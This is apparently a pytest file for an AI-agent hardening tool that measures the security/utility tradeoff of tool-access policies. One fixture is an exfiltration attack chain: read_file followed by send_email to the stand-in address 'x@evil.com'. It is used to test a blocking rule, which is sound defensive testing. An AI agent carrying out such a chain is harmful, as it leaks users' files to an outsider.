"""Tests for the security/utility tradeoff evaluation."""

from __future__ import annotations

from pathlib import Path

import pytest

from agent_hardener.shared.schemas import (
    AgentTrajectory,
    AttackIntensity,
    AttackIteration,
    AttackRecord,
    BenignTask,
    BenignTaskSuite,
    CapabilityAnnotations,
    ConfidentialityAnnotations,
    ConfidentialityLevel,
    DeploymentSpec,
    EnforcementAction,
    EnforcementRule,
    FailureType,
    GatewayEnforcementSpec,
    HarmCategory,
    PolicyCoverage,
    RedAgentFeedbackSchema,
    SAMOSPolicy,
    SessionTaintRules,
    TaintLevel,
    ToolAnnotation,
    ToolCall,
)
from agent_hardener.verifier import (
    evaluate_security_utility,
    load_benign_suite,
)
from agent_hardener.verifier.benign_loader import _parse_suite


def _policy(*, filesystem=False, network=False, enforcement_rules=None) -> SAMOSPolicy:
    return SAMOSPolicy(
        tool_name="read_file",
        generated_from_attack_cycles=1,
        confidentiality_annotations=ConfidentialityAnnotations(
            read_confidentiality=ConfidentialityLevel.LOW,
            write_confidentiality=ConfidentialityLevel.LOW,
            read_justification="", write_justification=""),
        capability_annotations=CapabilityAnnotations(filesystem=filesystem, network=network),
        session_taint_rules=SessionTaintRules(initial_session_taint=TaintLevel.LOW),
        enforcement_rules=enforcement_rules or [],
        gateway_enforcement=GatewayEnforcementSpec(
            tool_annotation=ToolAnnotation(
                name="read_file",
                read_confidentiality=ConfidentialityLevel.LOW,
                write_confidentiality=ConfidentialityLevel.LOW),
            session_initial_taint=TaintLevel.LOW,
            taint_is_monotonic=True, fail_secure_unknown_tools=True,
            policy_log_required=True, red_agent_feedback_schema=RedAgentFeedbackSchema()),
        deployment_spec=DeploymentSpec(isolation_level="separate_container"),
        policy_coverage=PolicyCoverage(),
    )


def _attack(record_id: str, score: float, calls) -> AttackRecord:
    traj = AgentTrajectory(prompt="x", tool_calls=calls)
    return AttackRecord(
        record_id=record_id, harm_category=HarmCategory.CYBERCRIME,
        tool_targeted="read_file", attack_chain=[c.tool_name for c in calls],
        attack_intensity=AttackIntensity.EASY, final_prompt_used="x",
        attempt_number_of_success=0 if score > 0.3 else None, final_score=score,
        attack_trajectory=[AttackIteration(attempt_number=0, prompt_used="x",
            trajectory=traj, score=score, success=score > 0.3)],
    )


def _benign(task_id, calls) -> BenignTask:
    return BenignTask(task_id=task_id, tool_calls=calls)


class TestDegenerateDenyAll:
    def test_deny_all_policy_flagged_degenerate(self):
        # filesystem=False blocks every read — attacks AND benign.
        policy = _policy(filesystem=False)
        attacks = [_attack("ATK-001", 0.9, [ToolCall(tool_name="read_file", parameters={}, success=True)])]
        benign = BenignTaskSuite(tool_name="read_file", tasks=[
            _benign("b1", [ToolCall(tool_name="read_file", parameters={"path": "/workspace/a"}, success=True)]),
            _benign("b2", [ToolCall(tool_name="read_file", parameters={"path": "/workspace/b"}, success=True)]),
        ])
        su = evaluate_security_utility(attacks, policy, benign, success_threshold=0.3)
        assert su.attack_block_rate == 1.0
        assert su.benign_pass_rate == 0.0
        assert su.over_block_rate == 1.0
        assert su.utility_security_f1 == 0.0
        assert su.degenerate_deny_all is True

    def test_permissive_policy_high_utility_low_security(self):
        # No capability denial, no rules: nothing blocked. Benign all pass,
        # attacks all pass (bad security, perfect utility).
        policy = _policy(filesystem=True, network=True)
        attacks = [_attack("ATK-001", 0.9, [ToolCall(tool_name="read_file", parameters={}, success=True)])]
        benign = BenignTaskSuite(tool_name="read_file", tasks=[
            _benign("b1", [ToolCall(tool_name="read_file", parameters={"path": "/ok"}, success=True)]),
        ])
        su = evaluate_security_utility(attacks, policy, benign, success_threshold=0.3)
        assert su.attack_block_rate == 0.0
        assert su.benign_pass_rate == 1.0
        assert su.over_block_rate == 0.0
        assert su.utility_security_f1 == 0.0  # ABR=0 -> harmonic mean 0
        assert su.degenerate_deny_all is False

    def test_surgical_policy_high_f1(self):
        # A targeted rule that blocks the exfil tool but not benign reads.
        rule = EnforcementRule(
            rule_id="ENF-EXFIL", trigger_condition="block send_email",
            action=EnforcementAction.BLOCK, reason="exfil", motivated_by_attack="ATK-001")
        policy = _policy(filesystem=True, network=True, enforcement_rules=[rule])
        # Attack chains read_file -> send_email (blocked at send_email).
        attacks = [_attack("ATK-001", 0.9, [
            ToolCall(tool_name="read_file", parameters={}, success=True),
            ToolCall(tool_name="send_email", parameters={"to": "x@evil.com"}, success=True),
        ])]
        # Benign is a bare read (no send_email) -> allowed.
        benign = BenignTaskSuite(tool_name="read_file", tasks=[
            _benign("b1", [ToolCall(tool_name="read_file", parameters={"path": "/ok"}, success=True)]),
        ])
        su = evaluate_security_utility(attacks, policy, benign, success_threshold=0.3)
        assert su.attack_block_rate == 1.0
        assert su.benign_pass_rate == 1.0
        assert su.utility_security_f1 == 1.0  # perfect: blocks attack, allows benign
        assert su.degenerate_deny_all is False


class TestUnmeasured:
    def test_no_benign_suite_reports_unmeasured(self):
        policy = _policy(filesystem=False)
        attacks = [_attack("ATK-001", 0.9, [ToolCall(tool_name="read_file", parameters={}, success=True)])]
        su = evaluate_security_utility(attacks, policy, None, success_threshold=0.3)
        assert su.n_benign_tasks == 0
        assert su.benign_pass_rate == 0.0
        assert su.degenerate_deny_all is False  # can't call it degenerate without benign data
        assert su.attack_block_rate == 1.0


class TestBenignLoader:
    def test_parse_suite_from_yaml(self, tmp_path: Path):
        p = tmp_path / "read_file.yaml"
        p.write_text(
            "tool_name: read_file\n"
            "tasks:\n"
            "  - task_id: t1\n"
            "    description: read a file\n"
            "    tool_calls:\n"
            "      - tool_name: read_file\n"
            "        parameters: {path: /workspace/x}\n"
            "        success: true\n",
            encoding="utf-8",
        )
        suite = _parse_suite(p, "read_file")
        assert suite.tool_name == "read_file"
        assert len(suite.tasks) == 1
        assert suite.tasks[0].task_id == "t1"
        assert suite.tasks[0].tool_calls[0].tool_name == "read_file"

    def test_repo_benign_suites_load(self):
        # The shipped benign corpora must load for all four demo tools.
        for tool in ["read_file", "send_email", "list_directory", "execute_command"]:
            suite = load_benign_suite(tool)
            assert suite is not None, f"missing benign suite for {tool}"
            assert len(suite.tasks) >= 3

    def test_every_corpus_tool_has_a_benign_suite(self):
        # Generalisation guard: adding a tool to mcp_tools/ without a benign
        # suite would make its security/utility tradeoff unmeasurable.
        from pathlib import Path
        corpus = Path(__file__).resolve().parents[1] / "mcp_tools"
        tools = sorted(p.stem for p in corpus.glob("*.yaml"))
        assert len(tools) >= 8, "corpus should have grown for generalisation"
        missing = [t for t in tools if load_benign_suite(t) is None]
        assert not missing, f"corpus tools missing benign suites: {missing}"

    def test_missing_suite_returns_none(self):
        assert load_benign_suite("nonexistent_tool_xyz") is None
